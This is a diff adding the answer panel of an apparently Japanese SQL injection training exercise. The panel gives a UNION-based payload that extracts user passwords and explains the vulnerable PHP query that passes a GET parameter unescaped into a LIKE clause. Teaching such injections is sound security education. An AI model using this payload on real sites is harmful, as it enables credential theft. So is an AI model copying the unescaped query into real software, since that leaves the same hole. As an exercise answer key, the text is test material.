@@ -1,0 +1,24 @@
+<button class="btn btn-danger m-2" type="button" data-toggle="collapse" data-target="#answer" aria-expanded="false" aria-controls="answer">
+    答えを表示
+</button>
+<div class="collapse m-4" id="answer">
+    <div class="card card-body text-left">
+        <h2>答え</h2>
+        <p class="text-danger">※答えは一例です。</p>
+        <figure class="bg-light">
+            ' UNION SELECT id, name, password FROM users;
+        </figure>
+        <h2>解説</h2>
+        <p>ソースコードを確認すると、下記のように入力された文字列をエスケープ処理等をせずに、直接LIKE句の検索文字列として使用しています。</p>
+        <figure class="bg-light">
+            SELECT id, name, email FROM users WHERE name LIKE '%{$_GET['name']}%'
+        </figure>
+        <p>
+            そのため、「'」を入力して検索文字を終わらせ、以降の文字列を別のSQL文としてDBに解釈させるようにしています。<br>
+            そして、UNION句を用いてpasswordをSELECTし、「;」を用いてここまでで1つのSQL文だと解釈させ、以降の文字列を無視させています。
+        </p>
+        <figure class="bg-light">
+            SELECT id, name, email FROM users WHERE name LIKE '%' UNION SELECT id, name, password FROM users;
+        </figure>
+    </div>
+</div>
